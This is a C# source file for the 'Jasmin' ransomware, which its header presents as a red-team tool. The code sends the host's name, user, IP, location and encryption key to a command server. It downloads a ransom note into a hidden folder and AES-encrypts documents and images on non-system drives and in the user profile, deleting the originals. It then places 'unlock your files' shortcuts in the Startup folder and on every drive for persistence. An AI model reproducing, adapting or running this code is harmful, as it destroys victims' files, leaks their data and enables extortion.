using System;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net;
using SharpCompress.Common;
using SharpCompress.Readers;
using System.Diagnostics;
using System.Management;
using IpInfo;

/* 
       ,--.                             ,--.          
     |  |  ,--,--.  ,---.  ,--,--,--. `--' ,--,--,  
,--. |  | ' ,-.  | (  .-'  |        | ,--. |      \ 
|  '-'  / \ '-'  | .-'  `) |  |  |  | |  | |  ||  | 
 `-----'   `--`--' `----'  `--`--`--' `--' `--''--'
 The Ransomware for RedTeams Coded by Siddhant Gour with 💖 💖 💖
  
  Payload  Coded in C#
  Server   Coded in PHP
  Database Coded in MySql
     */


namespace Jasmin_Encrypter
{
    class Program
    {
        public static string hostaddr     = "http://127.0.0.1/handshake.php"; //enter the of your webserver
        public static string AlertMsgLink = "http://127.0.0.1/alertmsg.zip";
        public static string AlertMsgPath = "C:\\Users\\Public\\Windows\\Ui\\";
        public static string AlertMsgFile = AlertMsgPath + "alertmsg.zip";
        public static string passwordkey  = "";
        public static string systemid     = "";
        public static string HDid         = "";

        static void Main(string[] args)
        {
            passwordkey = GeneratePassword();
            systemid    = GenerateSystemId();
            CheckConnection();
            MakeConnection ();
            RetriveFiles   ();
            AlertingUser   ();
            Console.ReadKey();

            //Creating All Required Methods
           
            string GeneratePassword()
            {
                var randomstring = new RNGCryptoServiceProvider();
                var buf = new byte[18]; //length not randomly picked, see 64Base, wikipedia
                randomstring.GetBytes(buf);
                string password = Convert.ToBase64String(buf);
                return password;
            }    //This method returns complex & random password
            string GenerateSystemId()
            {

                ManagementClass mangnmt = new ManagementClass("Win32_LogicalDisk");
                ManagementObjectCollection mcol = mangnmt.GetInstances();
                string result = "";
                foreach (ManagementObject strt in mcol)
                {
                    result += Convert.ToString(strt["VolumeSerialNumber"]);
                }
                return result;
            }    //Generating System Id
            bool   CheckConnection () //Checking for Internet Connection 
            {
                while (true)
                {
                    try
                    {
                        var i = new Ping().Send("www.google.com").Status;
                        if (i == IPStatus.Success)
                        {
                            Console.WriteLine("connected");
                            return true;
                        }
                        else { return false; }
                    }

                    catch (Exception)
                    {
                        Console.WriteLine("Not Connected");
                        Thread.Sleep(2000);
                        continue;
                    }
                }

            }    //checking for internet connection
            void   MakeConnection  ()
            {

                //Uploading System Information and Password
                try //for Exception handling 
                {
                    //Geeting Current Username
                    string username = Environment.UserName;

                    //Geeting Machine Hostname
                    string machine  = Environment.MachineName;

                
                    //Getting OS Name
                    //--------------------//

                    //Getting Current Time
                    string time = DateTime.Now.ToString("HH:mm:ss");

                    //Getting Date and Day
                    string date = DateTime.Today.ToString("dd/MM/yyyy") + ", " + DateTime.Now.DayOfWeek.ToString();

                    //Getting Ip Address
                    string ip = new System.Net.WebClient().DownloadString("https://api.ipify.org");

        
                    //Sending Data to the Server
                    var client = new HttpClient();
                    //Getting Location 
                   
                    String location()
                    {
                        var api = new IpInfoApi(client);
                        var rep = api.GetCurrentCityAsync();
                       //string location = new System.Net.WebClient().DownloadString("");       
                        Console.WriteLine($"City: {rep.Result}");
                        return rep.Result;
                    }

                    HDid = "A125OKA" + systemid + "4758ahzii";
                    string Passwd = HDid;
                    passwordkey = Passwd;
                   var pairs = new List<KeyValuePair<string, string>>
                    {
                    new KeyValuePair<string, string>("machine_name", machine),
                    new KeyValuePair<string, string>("computer_user", username),
                    new KeyValuePair<string, string>("systemid", systemid),
                    new KeyValuePair<string, string>("os", "Windows 10"),
                    new KeyValuePair<string, string>("date", date),
                    new KeyValuePair<string, string>("time", time),
                    new KeyValuePair<string, string>("ip", ip),
                    new KeyValuePair<string, string>("location", location()),
                    // new KeyValuePair<string, string>("location", "Unkown"),
                    new KeyValuePair<string, string>("password", passwordkey),                
                    new KeyValuePair<string, string>("handshake", "jasmin@123"),
                    };

                    var content = new FormUrlEncodedContent(pairs);

                    var response = client.PostAsync(hostaddr, content).Result;

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine(response);
                        Console.WriteLine(GenerateSystemId());
                        Console.WriteLine(GeneratePassword());
                    }
                    else
                    {
                        Console.WriteLine("No Connection");
                    }
                }
                catch (Exception)
                {
                }

                //Creating AlertMessageUi
                try
                {

                    StartDownload(); // Downloading Alert Message Ui from the server
                    //Write Systemid to HTML File
                    try
                    {
                        string SystemIdTag1 = "<h3  style=\"color: grey; font-size:95% \"> Your System Id is : " + GenerateSystemId() + " </h3>";
                        string SystemIdTag2 = "<h3  style=\"color: white; font-size:110% \"> Your System Id is : " + GenerateSystemId() + " </h3>";
                        string FileToEdit = @"C:\Users\Public\Windows\Ui\index.html";


                        WriteSystemId(SystemIdTag1, FileToEdit, 129);
                        WriteSystemId(SystemIdTag2, FileToEdit, 285);


                        void WriteSystemId(string newText, string fileName, int line_to_edit)
                        {
                            string[] arrLine = File.ReadAllLines(fileName);
                            arrLine[line_to_edit - 1] = newText;
                            File.WriteAllLines(fileName, arrLine);
                        }

                    }
                    catch
                    {
                        Console.WriteLine("Error While SystemID Writing");
                    }

                }
                catch
                {
                    Console.WriteLine("Error In Download");
                }


            }    //Making connection with web dashboard
            bool   StartDownload   ()
            {
                WebClient wc = new WebClient();
                while (true)
                {
                    try
                    {

                        if (Directory.Exists(AlertMsgPath))
                        {
                            Directory.Delete(AlertMsgPath, true);
                            Directory.CreateDirectory(AlertMsgPath).Attributes = FileAttributes.System | FileAttributes.Hidden;
                        }
                        else
                        {
                            Directory.CreateDirectory(AlertMsgPath).Attributes = FileAttributes.System | FileAttributes.Hidden;
                        }

                        wc.DownloadFile(AlertMsgLink, AlertMsgFile);
                        Thread.Sleep(450);
                        Console.WriteLine("Downloaded");
                        StartExtraction(); //Start Extraction Process
                        return true;

                    }
                    catch (WebException)
                    {
                        Console.WriteLine("Unable to Download\nRetrying Please wait..");
                        Thread.Sleep(2000);
                        continue;
                    }
                }
            }    //Downloading files from web dashboard 
            bool   StartExtraction ()
            {
                while (true) //working in a loop until file is being downloaded
                    try
                    {
                        if (File.Exists(AlertMsgFile))// starts only if file exists
                        {
                            using (Stream stream = File.OpenRead(AlertMsgFile))
                            {
                                var reader = ReaderFactory.Open(stream);
                                while (reader.MoveToNextEntry())
                                {
                                    if (!reader.Entry.IsDirectory)
                                    {
                                        reader.WriteEntryToDirectory(AlertMsgPath, new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
                                    }
                                }
                            }
                            return true;
                        }
                        else
                        {
                            return false;
                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }
            }    //Extracting Downloaded files
            void   RetriveFiles    ()
            {
                DriveInfo[] drives = DriveInfo.GetDrives(); //Disk Information Array
                string UserHomeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile); //Users's Default Home Directory       
                string[] extensions = { "*.pptx", "*.docx", "*.xlsx", "*.txt", "*.pdf", "*.500", "*.jpeg", "*.jpg", "*png" }; //target file extesnions    
                foreach (DriveInfo drive in drives)
                {
                    try
                    {
                        if (drive.Name == @"C:\") // skiping C drive
                        {
                            continue;
                        }

                        string dpath = drive.Name; // Drive Path
                        Console.WriteLine(dpath);

                        foreach (string l in extensions)
                        {
                            try
                            {

                                foreach (string d in Directory.EnumerateDirectories(dpath))
                                {
                                    try
                                    {

                                        foreach (string p in Directory.EnumerateFiles(d, l, SearchOption.AllDirectories))

                                            try
                                            {
                                                Thread t = new Thread(() => FileEncryption(p));
                                                t.Priority = ThreadPriority.AboveNormal;
                                                t.Start();

                                            }
                                            catch (UnauthorizedAccessException)
                                            {
                                                continue;
                                            }

                                    }
                                    catch (UnauthorizedAccessException)
                                    {
                                         continue;
                                    }
                                    catch (Exception)
                                    {
                                        continue;
                                    }

                                } //recursively list all the files in a drive
                                foreach (string p in Directory.EnumerateFiles(dpath, l))
                                {
                                    try
                                    {
                                        Thread t = new Thread(() => FileEncryption(p));
                                        t.Priority = ThreadPriority.AboveNormal;
                                        t.Start();
                                    }
                                    catch (UnauthorizedAccessException)
                                    {
                                        continue;
                                    }
                                   
                                }
                            }
                            catch (Exception)
                            {
                                continue;
                            }

                        }
                    }
                    catch (Exception )
                    {
                        continue;
                    }
                } //retrieving Drives files
                foreach (string l in extensions)
                {
                    try
                    {

                        foreach (string d in Directory.EnumerateDirectories(UserHomeDir))
                        {
                            try
                            {

                                foreach (string p in Directory.EnumerateFiles(d, l, SearchOption.AllDirectories))
                                    try
                                    {
                                        Thread t = new Thread(() => FileEncryption(p));
                                        t.Priority = ThreadPriority.AboveNormal;
                                        t.Start();
                                        
                                    }
                                    catch (UnauthorizedAccessException)
                                    {
                                        
                                        continue;
                                    }
                                    catch (ArgumentException)
                                    {
                                       
                                        continue;
                                    }

                            }
                            catch (UnauthorizedAccessException)
                            {
                               
                                continue;
                            }
                           

                        } //recursively list all the files in a drive
                        foreach (string p in Directory.EnumerateFiles(UserHomeDir, l))
                        {
                            try
                            {
                                Thread t = new Thread(() => FileEncryption(p));
                                t.Priority = ThreadPriority.AboveNormal;
                                t.Start();
                            }
                            catch (UnauthorizedAccessException)
                            {
                                
                                continue;
                            }
                          
                        }

                    }
                    catch (Exception)
                    {
                        
                        continue;
                    }

                }    //retrieving User's files


            }    //Retriving Files from every possible location based on their Extention
            void   FileEncryption(string path)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(path);
                byte[] passwordBytes      = Encoding.UTF8.GetBytes(passwordkey);
                passwordBytes             = SHA256.Create().ComputeHash(passwordBytes);
                byte[] bytesEncrypted     = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = path + ".jasmin";
                Console.WriteLine(path + ".jasmin");
                try
                {
                    File.WriteAllBytes(fileEncrypted, bytesEncrypted);
                    File.Delete(path);
                }
                catch
                {
                    Console.WriteLine("error ha bhaiya");
                   
                }
            } // Method for Encrypting Files using AES_Encrytpt Method
            byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;

                // Set your salt here, change it to meet your flavor:
                byte[] saltBytes = passwordBytes;
                // Example:
                //saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (CryptoStream cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            } // AES Encryption Algorithm
            void   AlertingUser()  //Ransomware Alert Message
            {                   
                string LauncherPath = @"C:\Users\Public\Windows\Ui\unlock your files.lnk";
                string StartupDir   = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\unlock your files.lnk";
                string Desktop      = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\unlock your files.lnk";
                string StartMenu    = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\unlock your files.lnk";

                Process.Start(LauncherPath);

                String[] Path = { StartupDir, Desktop, StartMenu };
                foreach (String p in Path)
                {
                    try
                    {
                        File.Copy(LauncherPath, p);
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                }               //Copying AlertMessage to Startup & Desktop 
                DriveInfo[] drives = DriveInfo.GetDrives(); //retrieving drives
                foreach (DriveInfo drive in drives)
                {
                    try
                    {
                        File.Copy(LauncherPath, drive.Name + @"\unlock your files.lnk");
                    }
                    catch(Exception)
                    {
                        continue;
                    }
                }      //Copying AlertMessage to Every Drive 
                foreach (string p in Directory.EnumerateFiles(AlertMsgPath, "*.*", SearchOption.AllDirectories))
                {
                    try
                    {
                        File.SetAttributes(p, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(err);
                        continue;
                    }
                } //Hiding Source folder
                foreach (string p in Directory.EnumerateDirectories(AlertMsgPath))
                {
                    try
                    {
                        DirectoryInfo dirInfo = new DirectoryInfo(p);
                        dirInfo.Attributes = FileAttributes.System | FileAttributes.Hidden;
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine(err);
                        continue;
                    }
                }


            }  //alerting the user
            








        }//end of Main Method
    }//end of Program Class
}//end of namespace
